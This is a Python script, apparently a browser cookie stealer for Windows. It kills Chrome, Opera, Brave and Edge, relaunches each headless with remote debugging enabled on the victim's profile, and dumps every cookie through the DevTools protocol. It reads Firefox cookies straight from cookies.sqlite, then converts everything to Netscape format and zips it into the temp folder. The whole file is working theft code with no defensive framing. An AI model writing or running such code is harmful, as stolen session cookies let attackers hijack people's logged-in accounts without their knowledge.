import requests
import websocket
from websocket import create_connection
import json
import subprocess
import os
import zipfile
import time
import sqlite3

DEBUG_PORT = 9222
DEBUG_URL = f'http://localhost:{DEBUG_PORT}/json'
CHROME_PATH = rf"C:\Program Files\Google\Chrome\Application\chrome.exe"
OPERA_GX_PATH = rf"C:\Users\{os.getenv('USERNAME')}\AppData\Local\Programs\Opera GX\launcher.exe"
BRAVE_PATH = rf"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
OPERA_PATH = rf"C:\Users\{os.getenv('USERNAME')}\AppData\Local\Programs\Opera\launcher.exe"
EDGE_PATH = rf"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
FIREFOX_PATH = rf"C:\Program Files\Mozilla Firefox\firefox.exe"
LOCAL_APP_DATA = os.getenv('LOCALAPPDATA')
USER_DATA_DIR = rf'{LOCAL_APP_DATA}\Google\Chrome\User Data'
BRAVE_USER_DATA_DIR = rf'{LOCAL_APP_DATA}\BraveSoftware\Brave-Browser\User Data'
FIREFOX_USER_DATA_DIR = rf'{LOCAL_APP_DATA}\Mozilla\Firefox\Profiles'

def get_debug_ws_url():
    for _ in range(10): 
        try:
            res = requests.get(DEBUG_URL)
            data = res.json()
            return data[0]['webSocketDebuggerUrl'].strip()
        except (requests.exceptions.RequestException, IndexError, KeyError):
            time.sleep(1)
    raise Exception("Failed to get WebSocket debugger URL")

def kill_browser(browser_name):
    subprocess.run(f'taskkill /F /IM {browser_name}', check=False, shell=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def start_debugged_browser(browser_path, user_data_dir):
    subprocess.Popen([browser_path, f'--remote-debugging-port={DEBUG_PORT}', '--remote-allow-origins=*', '--headless', f'--user-data-dir={user_data_dir}'], stdout=subprocess.DEVNULL)

def get_cookies_from_browser(browser_name, browser_path, user_data_dir):
    if browser_name == "firefox.exe":
        return get_firefox_cookies(user_data_dir)
    else:
        kill_browser(browser_name)
        start_debugged_browser(browser_path, user_data_dir)
        url = get_debug_ws_url()
        ws = create_connection(url)
        ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
        response = ws.recv()
        response = json.loads(response)
        cookies = response['result']['cookies']
        ws.close()
        kill_browser(browser_name)
        return cookies

def get_firefox_cookies(user_data_dir):
    cookies = []
    for profile in os.listdir(user_data_dir):
        profile_path = os.path.join(user_data_dir, profile)
        if os.path.isdir(profile_path):
            cookies_path = os.path.join(profile_path, 'cookies.sqlite')
            if os.path.exists(cookies_path):
                conn = sqlite3.connect(cookies_path)
                cursor = conn.cursor()
                cursor.execute("SELECT host, path, isSecure, expiry, name, value FROM moz_cookies")
                for row in cursor.fetchall():
                    cookies.append({
                        'domain': row[0],
                        'path': row[1],
                        'secure': row[2],
                        'expires': row[3],
                        'name': row[4],
                        'value': row[5]
                    })
                conn.close()
    return cookies

def convert_to_netscape_format(cookies):
    netscape_cookies = []
    for cookie in cookies:
        domain = cookie['domain']
        flag = 'TRUE' if domain.startswith('.') else 'FALSE'
        path = cookie['path']
        secure = 'TRUE' if cookie['secure'] else 'FALSE'
        expiration = cookie['expires'] if 'expires' in cookie else 0
        name = cookie['name']
        value = cookie['value']
        netscape_cookies.append(f"{domain}\t{flag}\t{path}\t{secure}\t{expiration}\t{name}\t{value}")
    return netscape_cookies

def create_zip_file(all_cookies):
    zip_path = os.path.join(os.environ["temp"], "cookies.zip")
    with zipfile.ZipFile(zip_path, 'w') as zipf:
        for browser_name, cookies in all_cookies.items():
            if cookies:
                netscape_cookies = convert_to_netscape_format(cookies)
                cookie_file_path = os.path.join(os.environ["temp"], f"{browser_name}_cookies.txt")
                with open(cookie_file_path, 'w') as cookie_file:
                    cookie_file.write("\n".join(netscape_cookies))
                zipf.write(cookie_file_path, os.path.basename(cookie_file_path))
                os.remove(cookie_file_path)
            else:
                print(f"No cookies found for {browser_name}")
    return zip_path

def grab_cookies():
    browsers = {
        "chrome.exe": (CHROME_PATH, USER_DATA_DIR),
        "opera.exe": (OPERA_PATH, USER_DATA_DIR),
        "opera_gx.exe": (OPERA_GX_PATH, USER_DATA_DIR),
        "brave.exe": (BRAVE_PATH, BRAVE_USER_DATA_DIR),
        "msedge.exe": (EDGE_PATH, USER_DATA_DIR),
        "firefox.exe": (FIREFOX_PATH, FIREFOX_USER_DATA_DIR)
    }

    all_cookies = {}
    for browser_name, (browser_path, user_data_dir) in browsers.items():
        try:
            cookies = get_cookies_from_browser(browser_name, browser_path, user_data_dir)
            if cookies:
                all_cookies[browser_name] = cookies
            else:
                print(f"No cookies found for {browser_name}")
        except Exception as e:
            print(f"Failed to get cookies from {browser_name}: {e}")

    zip_path = create_zip_file(all_cookies)
    return zip_path

if __name__ == "__main__":
    zip_path = grab_cookies()
    #print(f"Cookies saved to {zip_path}")